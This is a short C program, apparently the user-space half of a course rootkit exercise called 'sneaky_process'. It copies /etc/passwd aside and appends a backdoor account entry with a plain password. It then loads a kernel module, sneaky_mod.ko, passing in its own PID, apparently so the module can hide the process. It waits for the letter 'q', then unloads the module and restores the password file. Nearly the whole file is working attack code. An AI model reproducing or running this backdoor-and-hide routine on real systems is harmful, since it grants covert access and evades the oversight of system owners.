#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void print_ID(){
  printf("sneaky_process pid = %d\n", getpid());
}

void password_cp(){
  const char * cmd1 = "cp /etc/passwd /tmp/passwd";
  const char * cmd2 = "echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> '/etc/passwd'";
  system(cmd1);
  system(cmd2);
}

void load_sneakymod(){
  int pid = getpid();
  char result[128];
  //string cmd_str = "insmod ./sneaky_mod.ko spid=" + to_string(pid);
  sprintf(result, "insmod sneaky_mod.ko spid=%d", pid);
  system(result);
}

void read_keyboard(){
  while(1){
    char c;
    c = fgetc(stdin);
    if(c == 'q'){
      break;
    }
  }
}

void rmv_module(){
  system("rmmod sneaky_mod");
}

void restore_password(){
  const char * cmd1 = "cp /tmp/passwd /etc/passwd";
  const char * cmd2 = "rm /tmp/passwd";
  system(cmd1);
  system(cmd2);
}

int main(){
  print_ID();
  password_cp();
  load_sneakymod();
  read_keyboard();
  rmv_module();
  restore_password();
  return 0;
}
